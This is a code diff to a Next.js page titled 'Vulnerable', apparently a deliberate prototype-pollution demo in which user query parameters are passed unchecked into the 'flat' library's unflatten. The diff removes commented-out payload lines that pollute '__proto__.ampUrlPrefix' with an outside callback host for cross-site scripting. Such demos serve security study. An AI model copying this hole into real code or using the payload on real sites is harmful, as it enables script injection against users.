@@ -2,26 +2,20 @@ import Head from "next/head";
 
 var unflatten = require("flat").unflatten;
 
-export default function Home({ msg }) {
+export default function Vulnerable({ msg }) {
   return (
     <div>
       <Head>
         <title>Vulnerable</title>
       </Head>
-
-      <p>{msg} page!</p>
+      <div style={{ padding: "10px 20px" }}>
+        <p>💀 {msg} page!</p>
+      </div>
     </div>
   );
 }
 
-// Object.prototype.notFound = true;
-
 export async function getServerSideProps(context) {
-  // unflatten({
-  //   "__proto__.amp": "hybrid",
-  //   "__proto__.ampUrlPrefix": "https://xss-callback.pwnfunction.repl.co/",
-  // });
-
   const out = unflatten({ ...context.query });
 
   return {
